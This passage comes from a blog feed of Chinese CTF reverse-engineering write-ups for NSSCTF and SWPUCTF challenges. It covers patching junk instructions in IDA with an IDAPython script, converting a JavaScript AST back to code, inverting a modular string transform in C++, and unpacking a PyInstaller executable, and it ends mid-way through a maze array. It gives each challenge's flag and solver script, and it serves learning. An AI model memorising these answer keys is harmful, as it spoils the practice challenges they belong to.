class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v4 <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&#125;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>NSSCTF{5353316611126}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-string7.png" alt="NISACTF-string7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【NSSCTF】wordy</title>
      <link href="/posts/26a7eba5.html"/>
      <url>/posts/26a7eba5.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>花指令的处理</mark></p></li><li><p><mark>利用 IDA 的脚本嵌入功能，执行将 jmp 花指令的第一个字节 patch 成 0x90 再分析</mark></p></li></ul><hr><p><a href="https://www.ctfer.vip/problem/880">【NSSCTF】wordy</a></p><hr><h1 id="思路一（非预期解）"><a href="#思路一（非预期解）" class="headerlink" title="思路一（非预期解）"></a>思路一（非预期解）</h1><p>在文件的 16进制视图中可以看到 flag：<code>GFCTF&#123;u_are2wordy&#125;</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-wordy1.png" alt="NSSCTF-wordy1.png"></p><hr><h1 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h1><p>拖入 IDA，没有 main 函数，进入 start 函数查看</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-wordy2.png" alt="NSSCTF-wordy2.png"></p><p>这里已经发现报错信息了：<code>// positive sp value has been detected, the output may be wrong!</code></p><p>进入函数 <code>_libc_start_main()</code>，发现该函数无法 F5 反编译</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-wordy3.png" alt="NSSCTF-wordy3.png"></p><p>到 IDA View-A 中定位到该函数的位置</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-wordy4.png" alt="NSSCTF-wordy4.png"></p><p>发现指令 <code>jmp     short near ptr loc_1144+1</code> 跳转到了一大片疑似垃圾数据的位置，所以导致函数不能被 IDA 正常解析，应该又是花指令</p><p>因为数据量太大，这里用 python 脚本处理花指令</p><p>快捷键：<code>shift + F2</code>，嵌入脚本代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 利用 idapython 脚本解决重复工作</span>startaddr <span class="token operator">=</span> <span class="token number">0x1135</span>endaddr <span class="token operator">=</span> <span class="token number">0x3100</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>startaddr<span class="token punctuation">,</span> endaddr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> get_wide_byte<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xEB</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> get_wide_byte<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">:</span>            patch_byte<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Addr &#123;&#125; is patched"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><mark>思想就是将数据的第一个字节修改为 90</mark></p><p>恢复后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-wordy5.png" alt="NSSCTF-wordy5.png"></p><p>发现 main 函数就是一直在做 putchar 的输出，一次输出一个字符</p><p>在地址 0x2D56 开始的地方发现了 flag：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-wordy6.png" alt="NSSCTF-wordy6.png"></p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>GFCTF{u_are2wordy}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【NSSCTF】jump_by_jump</title>
      <link href="/posts/79ec29d3.html"/>
      <url>/posts/79ec29d3.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>识别花指令，以及花指令的去除与修复</mark></p></li><li><p><mark>IDA 中的 JUMPOUT 函数</mark></p></li></ul><hr><p><a href="https://www.ctfer.vip/problem/2313">【NSSCTF】jump_by_jump</a></p><hr><h1 id="思路一（非预期解）"><a href="#思路一（非预期解）" class="headerlink" title="思路一（非预期解）"></a>思路一（非预期解）</h1><p>拖入 IDA，<code>shift + F12</code> 查看字符串，可直接看到 flag：<code>NSSCTF&#123;Jump_b9_jump!&#125;</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump1.png" alt="NSSCTF-jump_by_jump1.png"></p><hr><h1 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h1><p>拖入 IDA，F5 查看 main 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump2.png" alt="NSSCTF-jump_by_jump2.png"></p><p>发现 JUMPOUT 函数，说明 main 函数无法正确编译</p><p>跟进到 0x411860</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump3.png" alt="NSSCTF-jump_by_jump3.png"></p><p>发现是有汇编代码的，但是 IDA 没有正确识别该函数的内容</p><p>在下面发现 jz、jnz 花指令，跳转到 <code>loc_41188C+1</code> 执行，然后执行 call 指令</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump4.png" alt="NSSCTF-jump_by_jump4.png"></p><p><strong>去除花指令：</strong><br>先将 call 指令 <code>call    near ptr 41BC4932h</code> 转换成硬指令<br>选中 call 指令，按快捷键 D</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump5.png" alt="NSSCTF-jump_by_jump5.png"></p><p>点击 yes 后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump6.png" alt="NSSCTF-jump_by_jump6.png"></p><p>将 call 的硬指令 <code>db 0E8h</code> 从 E8 改为 90：<em><strong>E8 表示执行，90 表示跳过</strong></em></p><p>选中指令 <code>db 0E8h</code><br>依次打开 <code>Edit -&gt; Patch program -&gt; Change byte</code> （或者 <code>右键 -&gt; pathing -&gt; change byte</code>）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump7.png" alt="NSSCTF-jump_by_jump7.png"></p><p>将开头的 E8 修改为 90</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump8.png" alt="NSSCTF-jump_by_jump8.png"></p><p>修改后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump9.png" alt="NSSCTF-jump_by_jump9.png"></p><p>再将硬指令 <code>db 90h</code> 转换回代码：<br>选中指令 <code>db 90h</code>，按快捷键 C</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump10.png" alt="NSSCTF-jump_by_jump10.png"></p><p>转换后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump11.png" alt="NSSCTF-jump_by_jump11.png"></p><p>接下来，将后面的指令依次按快捷键 C 进行修复 （黄色部分的所有地址）<br>全部修复后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump12.png" alt="NSSCTF-jump_by_jump12.png"></p><p>最后，将光标置于函数 main 开始的地方</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump13.png" alt="NSSCTF-jump_by_jump13.png"></p><p>按快捷键 P ，将修复后的代码重新生成函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump14.png" alt="NSSCTF-jump_by_jump14.png"></p><p>可以看到 IDA 生成了一个新的函数 <code>main_0</code><br>此时搜索函数名 <code>main</code>，就可以看到新生成的函数 <code>main_0</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump15.png" alt="NSSCTF-jump_by_jump15.png"></p><p>F5 生成 main_0 的伪代码，此时 IDA 可以正常编译</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump16.png" alt="NSSCTF-jump_by_jump16.png"></p><p>这里先把字符串 <code>&quot;NSSCTF&#123;Jump_b9_jump!&#125;&quot;</code> 赋值给 v5，然后 for 循环对 v5 进行操作，输出 v5<br>但是操作与 flag 无关，最终的 flag 就是 <code>NSSCTF&#123;Jump_b9_jump!&#125;</code></p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>NSSCTF{Jump_b9_jump!}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【SWPUCTF】astJS</title>
      <link href="/posts/c361c902.html"/>
      <url>/posts/c361c902.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>JS 逆向，了解 js 语言的抽象语法树（AST）</mark></p></li><li><p><mark>使用 escodegen 将 JavaScript AST 转换为代码</mark></p></li><li><p>在浏览器的控制台中可以直接运行 js 代码</p></li></ul><hr><p><a href="https://www.ctfer.vip/problem/409">【SWPUCTF】astJS</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>题目文件为一个 json 文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/SWPUCTF-astJS1.png" alt="SWPUCTF-astJS1.png"></p><p>该文件其实是 js 语言的 AST（抽象语法树），表现形式为 json 文件的格式</p><p>使用 <code>npm</code> 命令安装 <code>escodegen</code> 模块</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i escodegen <span class="token parameter variable">-g</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/SWPUCTF-astJS2.png" alt="SWPUCTF-astJS2.png"></p><p>利用 <code>escodegen</code> 将 js 语句的 AST 语法树 —— json 文件转化成 js 语句：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">esgenerate 附件.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/SWPUCTF-astJS3.png" alt="SWPUCTF-astJS3.png"></p><p>得到转换后的 js 代码如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">bE</span><span class="token punctuation">(</span><span class="token parameter">str<span class="token punctuation">,</span> key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> arr <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">i</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">bE</span><span class="token punctuation">(</span><span class="token string">'EXXH_Mpjx\x7FBxYnjggrM~eerv'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将该 js 代码在浏览器的控制台中运行，即可得到 flag：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/SWPUCTF-astJS4.png" alt="SWPUCTF-astJS4.png"></p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>NSSCTF{astIsReallyFunny}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【NSSCTF】jump_by_jump_revenge</title>
      <link href="/posts/a25ea9dc.html"/>
      <url>/posts/a25ea9dc.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>处理 JUMPOUT 花指令</mark></p></li><li><p><mark>正向爆破时，如果同时遇到两个未知变量的处理方法</mark><br>本题对于条件 <code>Str1[i] = (Str1[i] + Str1[(i * i + 123) % 21]) % 96 + 32</code> 无法进行常规的正向爆破</p></li></ul><hr><p><a href="https://www.ctfer.vip/problem/2316">【NSSCTF】jump_by_jump_revenge</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>将程序拖入 32位 IDA，查看 main 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump_revenge1.png" alt="NSSCTF-jump_by_jump_revenge1.png"></p><p>对 main 函数 F5 反编译后 JUMPOUT</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump_revenge2.png" alt="NSSCTF-jump_by_jump_revenge2.png"></p><p>在 IDA View-A 中定位 main</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump_revenge3.png" alt="NSSCTF-jump_by_jump_revenge3.png"></p><p>在 main 中未发现花指令，根据 <code>jmp     _main_0</code> 跟进到 <code>main_0</code> 的位置</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump_revenge4.png" alt="NSSCTF-jump_by_jump_revenge4.png"></p><p>在 main_0 中 <code>jmp     short loc_4118D2</code> 后，到 loc_4118D2 中 <code>jnz     short near ptr loc_4118DA+2</code> 跳转到 loc_4118DA<br>而 loc_4118DA 中 <code>jmp     near ptr 0C086A4CCh</code> 跳转到无效的地址使得 main 无法被 IDA 正确编译</p><p>选中 <code>jmp     near ptr 0C086A4CCh</code>，使用快捷键 D 转换为硬指令：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump_revenge5.png" alt="NSSCTF-jump_by_jump_revenge5.png"></p><p>选中 <code>db 0E9h</code>，右键 -&gt; Patching -&gt; Change byte，<em><strong>将开头的 E9 改为 90</strong></em></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump_revenge6.png" alt="NSSCTF-jump_by_jump_revenge6.png"></p><p>选中 <code>db 90h</code>，按快捷键 C 将硬指令转换为代码</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump_revenge7.png" alt="NSSCTF-jump_by_jump_revenge7.png"></p><p>在 main_0 函数起始处按快捷键 P，重新生成函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump_revenge8.png" alt="NSSCTF-jump_by_jump_revenge8.png"></p><p>此时 main 函数已经被成功修复：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump_revenge9.png" alt="NSSCTF-jump_by_jump_revenge9.png"></p><p>进入 main_0 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump_revenge10.png" alt="NSSCTF-jump_by_jump_revenge10.png"></p><p>根据条件 <code>j_strcmp(Str1, &quot;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&quot;)</code> 可以判断，还原后的 Str1 就是 flag</p><p>① 这里采用了余数的特点：<br><code>Str1[i] = Str1[i] % 96 + Str1[(i * i + 123) % 21] + 32</code> 或<br><code>Str1[i] = Str1[i] % 96 + Str1[(i * i + 123) % 21] - 96 + 32</code></p><p>② 变换得到刚开始未处理过的 <code>Str1[i]</code> 取余后的结果，即：<br><code>Str1[i] % 96      = Str1[i] - 32 - Str1[(i * i + 123) % 21]</code> 或<br><code>Str1[i] % 96 - 96 = Str1[i] - 32 - Str1[(i * i + 123) % 21]</code></p><p>③ 要得到初始的 <code>Str1[i]</code> 的值，只需将 <code>Str1[i] % 96</code> 或 <code>Str1[i] % 96 - 96</code> 的结果加上 n 个 96，如果加上 n 个 96 后的结果在 32 ~ 127 范围内，那么这个结果就是初始的 <code>Str1[i]</code> 的值</p><p>即：只需要将 <code>Str1[i] - 32 - Str1[(i * i + 123) % 21]</code> 的结果加上 n 个 96 即可，取位于 32 ~ 127 之中的结果</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span>  </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      string Str1 <span class="token operator">=</span> <span class="token string">"~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*"</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">-</span> Str1<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">123</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">32</span> <span class="token operator">||</span> Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> j <span class="token operator">*</span> <span class="token number">96</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">126</span><span class="token punctuation">)</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">29</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>NSSCTF{Jump_b9_jump!_r3V3n9e}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NSSCTF-jump_by_jump_revenge11.png" alt="NSSCTF-jump_by_jump_revenge11.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【SWPUCTF】老鼠走迷宫</title>
      <link href="/posts/236a5ace.html"/>
      <url>/posts/236a5ace.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>Python逆向</p></li><li><p><mark>迷宫题的处理方法</mark></p><ol><li>将迷宫中的 “1” 去掉，只关注 “0” 的上下左右</li><li>利用走迷宫脚本</li></ol></li><li><p>在线 MD5 加密，如果字符串结尾有回车符之类的，可能会导致结果不一样</p></li></ul><hr><p><a href="https://www.ctfer.vip/problem/406">【SWPUCTF】老鼠走迷宫</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>拖入 Exeinfo PE，由 PyInstaller 可知为 Python 逆向</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/SWPUCTF-%E8%80%81%E9%BC%A0%E8%B5%B0%E8%BF%B7%E5%AE%AB1.png" alt="SWPUCTF-老鼠走迷宫1.png"></p><p>使用 <code>pyinstxtractor.py</code> 进行解包：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/SWPUCTF-%E8%80%81%E9%BC%A0%E8%B5%B0%E8%BF%B7%E5%AE%AB2.png" alt="SWPUCTF-老鼠走迷宫2.png"></p><p>在解包后的文件夹中发现无后缀名的 5 文件，且 Exeinfo PE 无法识别该文件的类型</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/SWPUCTF-%E8%80%81%E9%BC%A0%E8%B5%B0%E8%BF%B7%E5%AE%AB3.png" alt="SWPUCTF-老鼠走迷宫3.png"></p><p>在 WinHex 中与 struct 文件对比后发现，文件 5 缺失了第一行的十六进制数据<br>将 struct 文件的第一行拷贝到 5 文件的第一行进行修复<br>修复后 Exeinfo PE 可识别为 .pyc 文件</p><p>在虚拟机的 python 3.8 下反编译：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/SWPUCTF-%E8%80%81%E9%BC%A0%E8%B5%B0%E8%BF%B7%E5%AE%AB4.png" alt="SWPUCTF-老鼠走迷宫4.png"></p><p>将代码复制出来：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token punctuation">,</span> msvcrt  row<span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span>  i<span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  maze <span class="token operator">=</span> <span class="token punctuation">[</span>   <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token 